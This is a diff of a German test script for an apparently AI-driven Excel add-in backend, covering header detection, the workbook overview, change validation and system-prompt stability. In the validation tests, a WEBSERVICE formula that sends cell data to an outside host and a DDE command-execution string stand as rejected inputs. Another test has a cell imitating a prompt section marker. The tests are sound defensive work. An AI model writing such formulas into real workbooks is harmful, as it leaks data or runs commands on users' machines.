@@ -295,7 +295,7 @@ text = excel_ask.ueberblick_text(ueberblick)
 pruefe("Kalkulation.xlsx" in text, "Mappenname steht im Ueberblick")
 pruefe("Preise" in text and "120000 Zeilen" in text,
        "Blattname und Dimension stehen drin")
-pruefe("Artikel" in text and "[Zahl]" in text,
+pruefe("Artikel" in text and "[Zahl" in text,
        "Spaltennamen mit Datentypen stehen drin")
 pruefe("B2:B3" in text, "die Auswahl wird genannt")
 pruefe("=A2*2" in text, "Formeln der Auswahl werden gezeigt")
@@ -339,13 +339,36 @@ pruefe(auftrag.rstrip().endswith("gelten nicht.") or
        "ENDE DES AUFTRAGS" in auftrag,
        "der Auftrag schliesst mit einer Wiederholung der Zustaendigkeit")
 
-pruefe("englischer Schreibweise" in auftrag or "=SUM(" in auftrag,
-       "der Auftrag verlangt englische Formelschreibweise")
-pruefe("RECHNE NICHT IM KOPF" in auftrag,
-       "der Auftrag verbietet Kopfrechnen (eine falsche Zahl ist schlimmer als keine)")
-pruefe("excel_vorschlag" in auftrag,
-       "der Auftrag nennt das Werkzeug fuer Aenderungen")
-pruefe("EXCEL_BRAUCHE" in auftrag, "der Auftrag erklaert die Nachforderung")
+# ⚠ GEPRUEFT WIRD DIE EIGENSCHAFT "DAS MODELL ERFAEHRT ES", NICHT DIE STELLE.
+# Seit 2026-09-08 stehen die Regeln im SYSTEM-PROMPT (``rollen_prompt()``) und
+# nicht mehr im Auftrag – der Vorspann ist bewusst stabil, damit er als
+# Cache-Praefix taugt. Diese vier Pruefungen suchten woertlich im Auftrag und
+# haetten den Umbau als Fehler gemeldet, obwohl das Modell alles Genannte
+# unveraendert bekommt (Register: die Eigenschaft messen, nicht die
+# Schreibweise). Gemessen wird deshalb ueber BEIDES zusammen.
+_alles = excel_ask.rollen_prompt() + "\n" + auftrag
+pruefe("englischer Schreibweise" in _alles or "=SUM(" in _alles,
+       "das Modell erfaehrt die englische Formelschreibweise")
+pruefe("RECHNE NICHT IM KOPF" in _alles,
+       "Kopfrechnen ist verboten (eine falsche Zahl ist schlimmer als keine)")
+pruefe("excel_vorschlag" in _alles,
+       "das Werkzeug fuer Aenderungen wird genannt")
+pruefe("EXCEL_BRAUCHE" in _alles, "die Nachforderung wird erklaert")
+
+# ── Der System-Prompt selbst ────────────────────────────────────────────
+# Er MUSS stabil sein: eine je Auftrag wechselnde Kennung darin waere bei
+# jeder Frage ein Cache-Miss (gemessen rund +80 % Latenz).
+_rp1 = excel_ask.rollen_prompt()
+_rp2 = excel_ask.rollen_prompt()
+pruefe(_rp1 == _rp2, "der System-Prompt ist ueber zwei Aufrufe identisch")
+pruefe("{nonce}" not in _rp1 and "ECHTHEITSKENNUNG DIESES AUFTRAGS" not in _rp1,
+       "der System-Prompt traegt KEINE auftragsbezogene Kennung")
+pruefe(len(_rp1) > 2000, "der System-Prompt ist der vollstaendige Vorspann")
+# Die Kennung steht im AUFTRAG – sonst tragen die Abschnittsmarken eine
+# Kennung, die das Modell nirgends erklaert bekommt.
+_a2, _k2 = excel_ask.auftrag("F", {"name": "x"})
+pruefe("ECHTHEITSKENNUNG DIESES AUFTRAGS: " + _k2 in _a2,
+       "die Echtheitskennung steht im Auftrag")
 
 # Fremdtext: eine Zelle, die eine Abschnittsmarke nachbaut.
 angriff = {
@@ -1277,6 +1300,348 @@ pruefe(excel_ask.skill_config() == {} and excel_ask.max_runden() == 3
        "faellt der Config-Zugriff aus, gelten die Vorgaben")
 _cfg.config.get_skill_states = _alt
 _skill_cfg()
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  ABSCHNITT 12: Der erweiterte Ueberblick, die neuen Aenderungstypen und der
+#  eigene System-Prompt (P1+P2, 2026-09-08)
+# ═══════════════════════════════════════════════════════════════════════════
+print("\n── 12. Erweiterter Ueberblick, neue Aenderungstypen, System-Prompt ──")
+
+import ast as _ast
+from backend import tabellenkopf as _tk
+
+# ── 12a. Kopfzeilen-Erkennung: die drei ECHTEN Bauformen ─────────────────
+# Die Faelle stammen aus der Produktionsdatei von ECHT (CLAUDE.md, "Excel:
+# bestehende Tabellen BEARBEITEN"): 13 Blaetter, drei verschiedene Bauformen.
+# Mit der bisherigen Add-in-Vorgabe "Typen aus Zeile 2" waeren 9 von 13
+# Blaettern falsch gelesen worden.
+pruefe(_tk.kopf_und_daten([["Artikel", "Preis", "Menge"], [1, 2.5, 3]]) == (1, 2),
+       "Bauform 2004: Kopf in Z1, Daten ab Z2")
+pruefe(_tk.kopf_und_daten([["00000000083", "00000000084", "00000000085"],
+                           [None, None, None],
+                           ["Artikel", "Preis", "Menge"],
+                           [1, 2.5, 3]]) == (3, 4),
+       "Bauform 2015: Nummerncodes ALS TEXT in Z1, Kopf in Z3")
+pruefe(_tk.kopf_und_daten([["Artikel", "Preis", "Menge"],
+                           [None, None, None],
+                           ["=B1", "=C1", "=D1"],
+                           [1, 2.5, 3]]) == (1, 4),
+       "Bauform 2019: wiederholte Kopfzeile als FORMEL wird uebersprungen")
+# Fail-safe: was sich nicht erkennen laesst, faellt auf das Verhalten von
+# vorher zurueck. Eine Erkennung, die im Zweifel etwas ANDERES behauptet, waere
+# schlechter als die alte feste Vorgabe.
+pruefe(_tk.kopf_und_daten([]) == (1, 2), "leere Mappe: Rueckfall (1, 2)")
+pruefe(_tk.kopf_und_daten([["a", "b", "c"], ["d", "e", "f"]]) == (1, 2),
+       "reine Texttabelle: Rueckfall (1, 2)")
+pruefe(_tk.kopf_und_daten("kein Blatt") == (1, 2), "Muell: Rueckfall (1, 2)")
+# DER TYP ENTSCHEIDET, nicht der Augenschein: Zahlen als Zeichenkette duerfen
+# NICHT als Datenanfang zaehlen – genau daran scheiterte Blatt 2015.
+pruefe(_tk.kopf_und_daten([["1", "2", "3"], ["Artikel", "Preis", "Menge"],
+                           [1, 2, 3]]) == (2, 3),
+       "Zahlen als TEXT zaehlen nicht als Datenanfang")
+
+# ── 12a2. Die openpyxl-Seite: Worksheet → Zeilen ────────────────────────
+# ⚠ ``tests/test_xlsx_tabellen.py`` (165 Pruefungen) braucht openpyxl und laeuft
+# nur auf DEV im venv. Damit der Umbau von ``_kopfzeile_raten`` nicht ungeprueft
+# bleibt, wird die UMSETZUNG hier gegen einen Minimal-Nachbau gemessen: mehr als
+# ``iter_rows(min_row, max_row, max_col, values_only)`` benutzt die Funktion
+# nicht. Das ersetzt den DEV-Lauf nicht, deckt aber genau die Zeilen ab, die der
+# Umbau angefasst hat.
+class _WsAttrappe:
+    def __init__(self, zeilen, wirft=False):
+        self._z, self._wirft = zeilen, wirft
+        self.gesehen = None
+
+    def iter_rows(self, min_row=1, max_row=1, max_col=40, values_only=False):
+        if self._wirft:
+            raise RuntimeError("geschuetztes Blatt")
+        self.gesehen = (min_row, max_row, max_col, values_only)
+        for r in self._z[min_row - 1:max_row]:
+            yield tuple(r[:max_col])
+
+
+_kr = None
+try:
+    import ast as _a2
+    _q = (ROOT / "skills" / "office" / "tabellen.py").read_text(encoding="utf-8")
+    _b = _a2.parse(_q)
+    for _k in _a2.walk(_b):
+        if isinstance(_k, _a2.FunctionDef) and _k.name == "_kopfzeile_raten":
+            _ns = {"tabellenkopf": _tk}
+            exec(compile(_a2.Module(body=[_k], type_ignores=[]), "<schnitt>", "exec"), _ns)
+            _kr = _ns["_kopfzeile_raten"]
+            break
+except Exception as _e:  # noqa: BLE001
+    print("  (Schnitt von _kopfzeile_raten fehlgeschlagen: %s)" % _e)
+
+pruefe(_kr is not None, "_kopfzeile_raten laesst sich schneiden und ausfuehren")
+if _kr:
+    _ws = _WsAttrappe([["00000000083", "00000000084", "00000000085"],
+                       [None, None, None],
+                       ["Artikel", "Preis", "Menge"],
+                       [1, 2.5, 3]])
+    pruefe(_kr(_ws) == (3, 4),
+           "openpyxl-Seite: dieselbe Bauform ergibt dasselbe Ergebnis wie der Kern")
+    pruefe(_ws.gesehen == (1, _tk.KOPF_SUCHTIEFE, 40, True),
+           "sie liest genau KOPF_SUCHTIEFE Zeilen mit values_only")
+    # Ein geschuetztes Blatt darf den Aufruf nicht kippen – dort gilt die alte
+    # Annahme, nicht ein Wurf.
+    # ⚠ ABGESICHERT AUFRUFEN: ohne das WIRFT die Pruefung, sobald der
+    # except-Zweig sabotiert ist – der Lauf endet ohne Bilanzzeile und ist von
+    # "nicht gelaufen" nicht zu unterscheiden (Register).
+    def _sicher(fn, *a):
+        try:
+            return fn(*a)
+        except Exception as _x:  # noqa: BLE001
+            return ("WIRFT", type(_x).__name__)
+
+    pruefe(_sicher(_kr, _WsAttrappe([], wirft=True)) == (1, 2),
+           "ein unlesbares Blatt faellt auf (1, 2) zurueck")
+
+# ── 12b. DRIFT-SCHRANKE: eine Regel, zwei Aufrufer ───────────────────────
+# ``skills/office/tabellen.py`` arbeitet auf openpyxl, ``excel_ask`` auf den
+# Client-Werten. Eine zweite FASSUNG der Regel liefe beim naechsten Feinschliff
+# auseinander – dann liest der Datei-Weg eine andere Kopfzeile als das Add-in,
+# an derselben Mappe. Geprueft wird, dass beide denselben Kern RUFEN.
+_tab_src = (ROOT / "skills" / "office" / "tabellen.py").read_text(encoding="utf-8")
+pruefe("from backend import tabellenkopf" in _tab_src,
+       "tabellen.py bezieht die Regel aus backend/tabellenkopf")
+pruefe("tabellenkopf.kopf_und_daten(" in _tab_src,
+       "tabellen.py RUFT den gemeinsamen Kern")
+_ask_src = (ROOT / "backend" / "excel_ask.py").read_text(encoding="utf-8")
+pruefe("tabellenkopf.kopf_und_daten(" in _ask_src,
+       "excel_ask RUFT denselben Kern")
+# Und die Regel steht nur EINMAL: kein zweiter Datenanfang-Suchlauf daneben.
+pruefe(_tab_src.count("len(zahlen) / len(gefuellt)") == 0,
+       "tabellen.py hat keine eigene Fassung der Datenanfang-Regel mehr")
+
+# ── 12c. Spaltenbuchstaben – die Adressen MUESSEN stimmen ────────────────
+pruefe(excel_ask.spaltenbuchstabe(1) == "A", "Spalte 1 = A")
+pruefe(excel_ask.spaltenbuchstabe(26) == "Z", "Spalte 26 = Z")
+pruefe(excel_ask.spaltenbuchstabe(27) == "AA", "Spalte 27 = AA")
+pruefe(excel_ask.spaltenbuchstabe(16384) == "XFD", "Spalte 16384 = XFD")
+# Rundlauf gegen die vorhandene Umrechnung der Gegenrichtung.
+pruefe(all(excel_ask._spalte_zu_index(excel_ask.spaltenbuchstabe(n)) == n
+           for n in (1, 2, 25, 26, 27, 52, 53, 702, 703, 16384)),
+       "Spaltenbuchstabe und _spalte_zu_index sind zueinander invers")
+
+# ── 12d. Der Ueberblick eines echten Rechenmodells ───────────────────────
+# Der Bereich beginnt bei C3 – das ist der Fall, der bis 2026-09-08 zu
+# Vorschlaegen in der FALSCHEN Spalte gefuehrt haette: die dritte Spalte ist
+# hier E, nicht C.
+_ub = {
+    "name": "Kalkulation.xlsx", "aktiv": "Preise",
+    "namen": [{"name": "Steuersatz", "bezug": "Preise!$C$1"}],
+    "blaetter": [{
+        "name": "Preise", "bereich": "C3:F120", "zeilen": 118, "spalten": 4,
+        "zeile_ab": 3, "spalte_ab": 3,
+        "probe": [["Artikel", "Netto", "MwSt", "Brutto"],
+                  ["Schraube", 12.5, 0.19, 14.875],
+                  ["Mutter", 3.0, 0.19, 3.57]],
+        "probeFormeln": [["", "", "", ""],
+                         ["", "", "", "=D4*(1+E4)"],
+                         ["", "", "", "=D5*(1+E5)"]],
+        "probeFormate": [["General"] * 4,
+                         ["General", "#,##0.00 €", "0%", "#,##0.00 €"],
+                         ["General", "#,##0.00 €", "0%", "#,##0.00 €"]],
+        "unten": [["SUMME", None, None, 18.445]],
+        "untenFormeln": [["", "", "", "=SUM(F4:F119)"]],
+        "untenAb": 120,
+        "tabellen": [{"name": "Tabelle1", "bereich": "C3:F120"}],
+        "fehler": [{"adresse": "F77", "wert": "#DIV/0!"}],
+    }],
+}
+_t = excel_ask.ueberblick_text(_ub)
+pruefe("C=Artikel" in _t and "F=Brutto" in _t,
+       "die Spalten tragen ihren BUCHSTABEN (C3:F120 beginnt bei C, nicht A)")
+pruefe("Kopfzeile: Zeile 3 | Daten ab Zeile 4" in _t,
+       "Kopfzeile und Datenanfang werden ERKANNT und genannt")
+pruefe("#,##0.00 €" in _t and "0%" in _t,
+       "die Zahlenformate der Datenzeile stehen im Ueberblick")
+pruefe("General" not in _t,
+       "'General' wird verworfen – es traegt keine Aussage")
+pruefe("F4: =D4*(1+E4)" in _t,
+       "FORMELN stehen mit ihrer vollen Adresse im Ueberblick")
+pruefe("Zeile 120" in _t and "=SUM(F4:F119)" in _t,
+       "die UNTEREN Zeilen samt Summenformel stehen im Ueberblick")
+pruefe("Steuersatz" in _t and "Preise!$C$1" in _t,
+       "benannte Bereiche stehen im Ueberblick")
+pruefe("Tabelle1" in _t, "Excel-Tabellen stehen im Ueberblick")
+pruefe("F77" in _t and "#DIV/0!" in _t, "Fehlerzellen stehen im Ueberblick")
+pruefe("[Zahl, #,##0.00 €]" in _t,
+       "Datentyp kommt aus dem ROHWERT der erkannten Datenzeile")
+
+# ── 12e. Der Rueckfall auf das ALTE Client-Format ────────────────────────
+# ⚠ NICHT vorsorglich: ein GEOEFFNETES Aufgabenfenster hat noch das alte
+# ``excel.js`` und schickt ``kopf``/``typen``/``beispiele``. Ohne den Zweig
+# zeigte der Ueberblick fuer jeden offenen Tab GAR KEINE Spalten – schlechtere
+# Antworten als vorher, bis der Benutzer neu laedt.
+_alt_ub = {"name": "a.xlsx", "aktiv": "P", "blaetter": [{
+    "name": "P", "bereich": "A1:C9", "zeilen": 9, "spalten": 3,
+    "kopf": ["Artikel", "Preis", "Menge"], "typen": ["Text", "Zahl", "Zahl"],
+    "beispiele": [["Schraube", "12,5", "3"]]}]}
+_ta = excel_ask.ueberblick_text(_alt_ub)
+pruefe("A=Artikel" in _ta and "[Text]" in _ta,
+       "ALTES Format: die Spalten stehen weiterhin im Ueberblick")
+pruefe("Schraube" in _ta, "ALTES Format: die Beispielzeile steht weiterhin drin")
+
+# ── 12f. Reihenfolge und Budget ──────────────────────────────────────────
+# AKTIVES Blatt zuerst: bei 30 Blaettern reicht der Deckel sonst fuer die
+# ersten drei, und ausgerechnet das Blatt der Frage faellt heraus.
+_viele = {"name": "v.xlsx", "aktiv": "Ziel", "blaetter": []}
+for _i in range(20):
+    _viele["blaetter"].append({
+        "name": "B%02d" % _i, "bereich": "A1:AN60", "zeilen": 60, "spalten": 40,
+        "zeile_ab": 1, "spalte_ab": 1,
+        "probe": [["Spalte%02d" % _k for _k in range(40)]] +
+                 [[float(_k) for _k in range(40)] for _ in range(4)],
+        "probeFormeln": [[""] * 40] * 5,
+        "probeFormate": [["#,##0.00 €"] * 40] * 5})
+_viele["blaetter"].append({
+    "name": "Ziel", "bereich": "A1:B4", "zeilen": 4, "spalten": 2,
+    "zeile_ab": 1, "spalte_ab": 1,
+    "probe": [["Kennzahl", "Wert"], ["Umsatz", 100.0], ["Kosten", 40.0]],
+    "probeFormeln": [["", ""], ["", ""], ["", ""]],
+    "probeFormate": [["General", "General"]] * 3})
+_tv = excel_ask.ueberblick_text(_viele)
+pruefe(_tv.find("• Ziel") < _tv.find("• B00"),
+       "das AKTIVE Blatt steht vor den uebrigen")
+pruefe("Kennzahl" in _tv, "das aktive Blatt geht AUSFUEHRLICH mit")
+pruefe(len(_tv) <= excel_ask.MAX_UEBERBLICK_LEN,
+       "der Ueberblick bleibt im Deckel (%d Zeichen)" % len(_tv))
+pruefe("Details nicht mitgeschickt" in _tv or "nicht mitgeschickt" in _tv,
+       "weggelassene Blaetter werden BENANNT, nicht verschwiegen")
+pruefe(all(("• B%02d" % _i) in _tv for _i in range(20)),
+       "jedes Blatt wird mindestens mit seinem Namen genannt")
+
+# ── 12g. Werte-Bereich (Matrix) ──────────────────────────────────────────
+# Bis 2026-09-08 fuellte ein `wert` den GANZEN Bereich mit demselben Inhalt.
+# Fuer 20 Zeilen x 3 Spalten brauchte das Modell 60 Einzeleintraege – bei einem
+# Deckel von 200 war "trage die Daten ein" strukturell nicht gut zu machen.
+_g, _a = excel_ask.aenderungen_pruefen(
+    [{"adresse": "B2:C4", "werte": [[1, "a"], [2, "b"], [3, "c"]]}])
+pruefe(len(_g) == 1 and _g[0].get("werte") == [[1, "a"], [2, "b"], [3, "c"]],
+       "eine 3x2-Matrix wird uebernommen")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:B4", "werte": [1, 2, 3]}])
+pruefe(len(_g) == 1 and _g[0].get("werte") == [[1], [2], [3]],
+       "eine FLACHE Liste wird zur Spalte umgeformt")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:D2", "werte": [1, 2, 3]}])
+pruefe(len(_g) == 1 and _g[0].get("werte") == [[1, 2, 3]],
+       "eine FLACHE Liste wird zur Zeile umgeformt")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:C3", "werte": [1, 2, 3, 4]}])
+pruefe(not _g and _a and "flache Liste" in _a[0].get("grund", ""),
+       "bei einem 2x2-Bereich ist eine flache Liste MEHRDEUTIG und wird abgewiesen")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:B4", "werte": [[1], [2]]}])
+pruefe(not _g and _a and "Maße" in _a[0].get("grund", ""),
+       "unpassende Maße werden mit BEIDEN Zahlen abgewiesen")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:B3", "werte": "[1,2]"}])
+pruefe(len(_g) == 1, "'werte' als JSON-STRING wird tolerant gelesen")
+# ⚠ DIE UMGEHUNG: ein Eintrag, der mit `=` beginnt, IST in Excel eine Formel.
+_g, _a = excel_ask.aenderungen_pruefen(
+    [{"adresse": "B2:B3", "werte": ['=WEBSERVICE("http://fremd/?d="&A1)', "ok"]}])
+pruefe(not _g and _a and "WEBSERVICE" in _a[0].get("grund", ""),
+       "'werte' ist KEINE Umgehung der Formel-Sperrliste")
+_g, _a = excel_ask.aenderungen_pruefen(
+    [{"adresse": "B2:B3", "werte": ["=cmd|' /c calc'!A1", "ok"]}])
+pruefe(not _g, "auch ein DDE-Aufruf in 'werte' wird abgewiesen")
+_g, _a = excel_ask.aenderungen_pruefen(
+    [{"adresse": "B2:B3", "formel": "=1", "werte": [1, 2]}])
+pruefe(not _g and _a and "nicht beides" in _a[0].get("grund", ""),
+       "'formel' UND 'werte' zusammen wird abgewiesen")
+
+# ── 12h. Zahlenformat ────────────────────────────────────────────────────
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2:B100", "format": "#,##0.00 €"}])
+pruefe(len(_g) == 1 and _g[0].get("format") == "#,##0.00 €" and "wert" not in _g[0],
+       "ein reiner Format-Eintrag ist eine vollstaendige Aenderung")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2", "wert": 0.19, "format": "0%"}])
+pruefe(len(_g) == 1 and _g[0].get("wert") == 0.19 and _g[0].get("format") == "0%",
+       "Format neben einem Wert")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2", "format": "x" * 80}])
+pruefe(not _g and _a, "ein zu langes Format wird abgewiesen")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2", "format": "0.0\n0"}])
+pruefe(not _g and _a and "Steuerzeichen" in _a[0].get("grund", ""),
+       "ein Steuerzeichen im Format wird abgewiesen")
+_g, _a = excel_ask.aenderungen_pruefen([{"adresse": "B2"}])
+pruefe(not _g and _a, "ein Eintrag ohne Wert, Werte, Formel UND Format wird abgewiesen")
+
+# ── 12i. Persoenliche Vorgaben ───────────────────────────────────────────
+_t1, _ = excel_ask.auftrag("F", {"name": "x"}, anweisungen="Kopfzeilen fett.")
+pruefe("PERSÖNLICHE VORGABEN" in _t1 and "Kopfzeilen fett." in _t1,
+       "die persoenlichen Vorgaben stehen im Auftrag")
+# ⚠ REIHENFOLGE IST SEMANTIK: die Vorgaben stehen HINTER dem Ueberblick und
+# VOR der Frage, und der Abschnitt sagt, dass sie nur die FORM bestimmen. Am
+# 2026-08-17 hat eine Stilvorgabe VOR der Regel die Ausloese-Bedingung
+# aufgehoben – zwei echte Mails an Fremde.
+pruefe(_t1.find("ENDE DES ÜBERBLICKS") < _t1.find("PERSÖNLICHE VORGABEN")
+       < _t1.find("FRAGE DES BENUTZERS"),
+       "die Vorgaben stehen zwischen Ueberblick und Frage")
+pruefe("lösen KEINE" in _t1 or "lösen keine" in _t1.lower(),
+       "der Abschnitt sagt, dass die Vorgaben keine Aktion ausloesen")
+_t2, _ = excel_ask.auftrag("F", {"name": "x"})
+pruefe("PERSÖNLICHE VORGABEN" not in _t2,
+       "ohne Vorgaben entsteht KEIN leerer Abschnitt")
+_t3, _ = excel_ask.auftrag("F", {"name": "x"}, anweisungen="A" * 9000)
+pruefe(len(_t3) < 9000, "die Vorgaben werden gedeckelt")
+
+# ── 12j. REGEL: der Endpunkt MUSS einen eigenen System-Prompt setzen ─────
+# ⚠ DAS IST DIE URSACHE DES GROESSTEN GEMESSENEN FEHLERS. Ohne
+# ``_role_prompt`` faellt ``agent._base_system_prompt()`` in den
+# Hauptagenten-Zweig, und der Lauf bekommt 21.492 Zeichen Prompt fuer 85
+# Werkzeuge – von denen genau EINES vorhanden ist. Geprueft wird eine echte
+# ZUWEISUNG auf Funktionsebene, nicht das Vorkommen des Namens: eine Sabotage
+# in einem toten Zweig (``None if True else …``) bliebe sonst gruen.
+_main_src = (ROOT / "backend" / "main.py").read_text(encoding="utf-8")
+_baum = _ast.parse(_main_src)
+_ep = None
+for _k in _ast.walk(_baum):
+    if isinstance(_k, (_ast.FunctionDef, _ast.AsyncFunctionDef)) \
+            and _k.name == "excel_ask_endpoint":
+        _ep = _k
+        break
+pruefe(_ep is not None, "excel_ask_endpoint im Syntaxbaum gefunden")
+
+def _setzt_attribut(knoten, attr):
+    """Wird ``attr`` im Rumpf WIRKLICH zugewiesen (nicht bloss genannt)?"""
+    for k in _ast.walk(knoten):
+        if not isinstance(k, _ast.Assign):
+            continue
+        for z in k.targets:
+            if isinstance(z, _ast.Attribute) and z.attr == attr:
+                return True
+    return False
+
+pruefe(_ep is not None and _setzt_attribut(_ep, "_role_prompt"),
+       "der Endpunkt SETZT _role_prompt (sonst gilt der Hauptagenten-Prompt)")
+pruefe(_ep is not None and _setzt_attribut(_ep, "_role_tools"),
+       "der Endpunkt setzt _role_tools (harte Werkzeug-Schranke)")
+pruefe("rollen_prompt()" in _ast.get_source_segment(_main_src, _ep or _baum) or
+       "rollen_prompt" in _ast.get_source_segment(_main_src, _ep or _baum),
+       "der Prompt kommt aus excel_ask.rollen_prompt() – keine zweite Fassung")
+
+# ── 12k. DRIFT-SCHRANKE: die Fehlerwert-Liste steht in ZWEI Sprachen ─────
+# Backend und Client muessen dieselben Fehlerwerte erkennen: der Client baut
+# daraus die Fehlerzellen-Liste des Ueberblicks UND die Pruefung nach dem
+# Schreiben, das Backend die Typangabe. Laufen sie auseinander, meldet das
+# Fenster eine Zelle als fehlerfrei, die der Ueberblick als Fehler fuehrt.
+_js = (ROOT / "frontend" / "excel-addin" / "excel.js").read_text(encoding="utf-8")
+_m = re.search(r"var FEHLERWERTE = \[(.*?)\];", _js, re.S)
+pruefe(_m is not None, "die Fehlerwert-Liste steht in excel.js")
+if _m:
+    _js_werte = set(re.findall(r"'([^']+)'", _m.group(1)))
+    _py_werte = set(excel_ask._FEHLERWERTE)
+    pruefe(_js_werte == _py_werte,
+           "Backend und Client kennen DIESELBEN Fehlerwerte "
+           "(nur Backend: %s / nur Client: %s)"
+           % (sorted(_py_werte - _js_werte) or "-",
+              sorted(_js_werte - _py_werte) or "-"))
+pruefe(excel_ask.ist_fehlerwert("#REF!") and excel_ask.ist_fehlerwert("#BEZUG!"),
+       "deutsche UND englische Fehlerwerte werden erkannt")
+pruefe(not excel_ask.ist_fehlerwert("#1 Kunde"),
+       "ein Text mit '#' ist KEIN Fehlerwert")
+pruefe(not excel_ask.ist_fehlerwert(12.5) and not excel_ask.ist_fehlerwert(None),
+       "eine Zahl ist kein Fehlerwert")
+
 
 print("\n" + "=" * 52)
 print("Bestanden: %d / Fehlgeschlagen: %d" % (_ok, _fail))
